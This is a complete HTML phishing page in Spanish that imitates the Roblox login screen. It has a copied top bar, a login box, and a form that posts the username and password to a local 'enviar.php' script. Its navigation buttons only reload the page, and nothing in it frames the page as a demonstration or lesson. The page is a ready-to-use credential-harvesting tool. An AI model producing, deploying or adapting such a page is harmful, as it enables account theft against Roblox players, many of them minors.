<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Roblox Login</title>

<style>
body {
margin: 0;
font-family: Arial, sans-serif;
background: #000;
overflow: hidden;
}

/* BACKGROUND */
.bg {
position: fixed;
width: 100%;
height: 100%;
z-index: -2;
}

.bg img {
position: absolute;
width: 220px;
border-radius: 14px;
transform: rotate(-15deg);
opacity: 0.9;
}

.bg img:nth-child(1){ top:10%; left:10%;}
.bg img:nth-child(2){ top:20%; right:15%; transform: rotate(12deg);}
.bg img:nth-child(3){ bottom:15%; left:20%;}
.bg img:nth-child(4){ bottom:10%; right:10%;}
.bg img:nth-child(5){ top:50%; left:45%; transform: rotate(8deg);}

/* OVERLAY */
.overlay {
position: fixed;
width: 100%;
height: 100%;
background: rgba(0,0,0,0.75);
backdrop-filter: blur(6px);
z-index: -1;
}

/* TOPBAR */
.topbar {
position: fixed;
top: 0;
width: 100%;
height: 48px;
background: rgba(20,20,20,0.95);
display: flex;
align-items: center;
padding: 0 20px;
color: white;
}

.topbar-left {
display: flex;
gap: 20px;
}

.topbar-left span {
color: #bbb;
cursor: pointer;
}

.topbar-left span:hover {
color: white;
}

.topbar-center {
position: absolute;
left: 50%;
transform: translateX(-50%);
}

.search {
background: #2a2a2a;
border: none;
padding: 7px 14px;
border-radius: 20px;
color: white;
width: 260px;
}

.topbar-right {
margin-left: auto;
display: flex;
gap: 10px;
}

.btn-blue {
background: #3b82f6;
color: white;
border: none;
padding: 6px 14px;
border-radius: 6px;
cursor: pointer;
}

.btn-dark {
background: transparent;
border: 1px solid #555;
color: white;
padding: 6px 14px;
border-radius: 6px;
cursor: pointer;
}

/* LOGIN BOX */
.container {
position: absolute;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
background: rgba(35,35,35,0.95);
padding: 30px;
width: 360px;
border-radius: 10px;
color: white;
box-shadow: 0 0 30px rgba(0,0,0,0.5);
}

h1 {
font-size: 30px;
font-weight: 800;
margin-bottom: 18px;
color: #e5e7eb;
}

input {
width: 100%;
padding: 12px;
margin: 8px 0;
background: #2a2a2a;
border: 1px solid #444;
border-radius: 8px;
color: white;
}

button {
width: 100%;
padding: 12px;
margin-top: 10px;
border-radius: 8px;
background: transparent;
border: 1px solid #555;
color: white;
cursor: pointer;
}

button:hover {
background: #3a3a3a;
}

#error {
color: #ff4d4d;
margin-top: 10px;
display: none;
}
</style>
</head>

<body>

<div class="bg">
<img src="https://picsum.photos/300/300?1">
<img src="https://picsum.photos/300/300?2">
<img src="https://picsum.photos/300/300?3">
<img src="https://picsum.photos/300/300?4">
<img src="https://picsum.photos/300/300?5">
</div>

<div class="overlay"></div>

<div class="topbar">
<div class="topbar-left">
<span onclick="reloadWithTransition()">Descubrir</span>
<span onclick="reloadWithTransition()">Mercado</span>
<span onclick="reloadWithTransition()">Crear</span>
<span onclick="reloadWithTransition()">Robux</span>
</div>

<div class="topbar-center">
<input class="search" placeholder="Buscar">
</div>

<div class="topbar-right">
<button class="btn-blue" onclick="reloadWithTransition()">Registro</button>
<button class="btn-dark" onclick="reloadWithTransition()">Iniciar sesión</button>
</div>
</div>

<div class="container">

<h1>Iniciar sesión en Roblox</h1>

<form action="enviar.php" method="POST">
  <input type="text" name="usuario" placeholder="Usuario/correo/teléfono" required>
  <input type="password" name="password" placeholder="Contraseña" required>
  <button type="submit">Iniciar sesión</button>
</form>

<p id="error">Datos incorrectos</p>

</div>

<script>
function reloadWithTransition() {
location.reload();
}
</script>

</body>
</html>
